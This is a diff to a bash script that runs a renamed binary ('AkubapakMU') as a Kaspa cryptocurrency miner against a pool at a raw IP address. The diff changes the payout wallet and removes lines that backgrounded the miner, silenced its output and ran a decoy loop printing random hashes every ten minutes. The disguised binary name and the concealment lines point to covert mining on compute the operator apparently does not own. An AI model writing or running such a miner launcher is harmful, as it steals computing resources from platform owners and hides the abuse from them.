@@ -4,7 +4,6 @@ chmod 700 AkubapakMU
 #!/bin/bash
 
 POOL=stratum+ssl://134.122.17.41:80
-WALLET=kaspa:qzmtswr7anhquvdj3cd2h9z5pwjjnq3hg9k7y6yqtd56299kmk82zqnja6qqa
+WALLET=kaspa:qzhva42mxq008mp25jfwrqqeavp8t38r5qynm3fq44zwtpptjyezqk09sxvme
 
-./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl > /dev/null 2>&1 &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
+./AkubapakMU --algo KASPA --pool $POOL --user $WALLET $@ --no-cl
